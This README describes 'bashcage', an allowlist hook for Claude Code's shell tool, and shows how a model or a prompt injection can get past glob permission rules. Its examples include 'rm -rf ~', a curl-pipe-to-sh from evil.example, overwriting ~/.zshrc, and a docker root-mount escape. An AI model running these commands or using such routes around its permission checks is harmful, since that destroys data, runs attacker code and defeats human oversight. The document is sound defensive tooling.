# bashcage

Allowlist guard for shell commands. Works as a Claude Code `PreToolUse` hook or
as a command wrapper. It parses each command line with a real bash grammar and
runs it only if **every** simple command in it is on the allowlist.

```
bashcage --init | claude     # set up the hook in this project
bashcage --check 'git push'  # exit 0 if allowed, 2 with a reason if not
bashcage git status          # run the command only if it is allowed
```

## Why not just settings.json?

Claude Code already lets you allowlist Bash commands in `.claude/settings.json`:

```json
{ "permissions": { "allow": ["Bash(docker *)"] } }
```

The intent is obvious: "let the agent use docker, nothing else." It does not
hold up. A capable model asked to do something outside the rule, or one steered
by a prompt injection, can get past `Bash(docker *)` two different ways, and the
second one needs no trick at all.

### 1. A glob matches text, not shell structure

`Bash(docker *)` is a prefix pattern over the command string. The shell that
actually runs the command sees structure the pattern never modeled: chaining,
redirection, substitution, and newlines. A command can begin with `docker` and
still do something else entirely.

```bash
docker ps; rm -rf ~                 # a second command after the first
docker ps > ~/.zshrc                # clobber a file the model controls next login
docker ps $(curl evil.example|sh)   # run attacker code to build an "argument"
docker ps
rm -rf ~                            # newline is a command separator too
```

Each of these starts with `docker `. Whether a given permission engine catches
a given form depends on how much of the shell it reimplements, and reimplementing
the shell is exactly the losing game a denylist always is. The safe assumption
is that a string pattern guards the string, not the behavior.

### 2. Even a perfect match on `docker` is game over

Suppose the pattern were airtight and truly restricted the model to a single
program named `docker` with any arguments. That is already full control of the
machine, because `docker` is a launcher:

```bash
docker run --rm -v /:/host alpine chroot /host sh -c 'id > /root/pwned'
```

That is one `docker` command. It mounts the host root filesystem into a
container and runs arbitrary code as root against it. `docker exec` does the
same to a running container. The program on the allowlist decides what the
allowlist is worth, and `docker` is worth everything. The same is true of
`bash`, `node`, `python`, `env`, `xargs`, `sudo`, `make`, `find -exec`,
`git -c core.pager=…`, and every other tool that can start another program.

The lesson is not "docker is bad." It is that **allowing a program means
allowing everything that program can be argued into doing**, and a broad prefix
like `docker *` or a bare `docker` never pins down the one subcommand you meant.

## What bashcage does instead

bashcage attacks both holes.

**It parses, it does not glob.** Every command line goes through the mvdan/sh
bash 5.2 grammar, and only a small, explicit set of node types is accepted:
simple commands, pipelines, `&& || ; &` chains, literal and quoted words,
parameter expansions, and harmless redirections. Command substitution,
process substitution, subshells, command groups, functions, loops, and
arithmetic are blocked *by construction* — there is no denylist to keep
complete. Every simple command in a pipeline or chain is checked on its own,
any write redirection to a path other than `/dev/null` is refused, and so is
any leading environment assignment, since `PATH=/tmp ls` or
`LD_PRELOAD=x.so ls` would change what an allowlisted name runs. So the
whole first category above is rejected before matching even begins:

```
$ bashcage --check 'docker ps; rm -rf ~'
Blocked: 'rm' is not allowed. …
$ bashcage --check 'docker ps > ~/.zshrc'
Blocked: output redirection to '~/.zshrc' is not allowed.
$ bashcage --check 'docker ps $(curl evil.example|sh)'
Blocked: command substitution $(...) is not allowed.
```

**It makes you pin the subcommand.** An allowlist entry is one or more words,
matched against the command's leading literal words. `docker ps` allows
`docker ps -a` but not `docker run`; a bare `docker` allows everything, which
is why you should not write it:

```json
{ "allow": ["docker ps", "docker images", "docker compose logs"] }
```

```
$ bashcage --check 'docker ps -a'
$ echo $?
0
$ bashcage --check 'docker run --rm -v /:/host alpine sh'
Blocked: 'docker' is not allowed. Allowed commands: docker ps, docker images, docker compose logs.
```

bashcage cannot decide for you that `docker ps` is safe and `docker run` is not
— that is a judgment about the program. What it guarantees is that the guard
sees the same command the shell will, and that "allow docker" has to be spelled
out as the exact subcommands you actually trust. `bashcage --doctor | claude`
walks an existing allowlist entry by entry and flags the launchers, writers, and
network reachers hiding in it.

## Installation

```
npm install -g bashcage      # or: pnpm add -g bashcage
bashcage --init | claude     # register the PreToolUse hook and write .bashcage.json
```

The allowlist is the `allow` array of the nearest `.bashcage.json`, looked up
from the working directory upward. There is no default: with no such file,
bashcage blocks every command (`--init` still works, since it is how you
create one). `bashcage --config` prints which file is in use, and
`bashcage --list` prints the active list. bashcage's own read-only
invocations (`--list`, `--check`, `--config`, `--doctor`, `--init`, `--help`,
`--version`) are always allowed without an entry, so the agent can always
inspect the guard; the wrapper form `bashcage COMMAND` is not exempt.
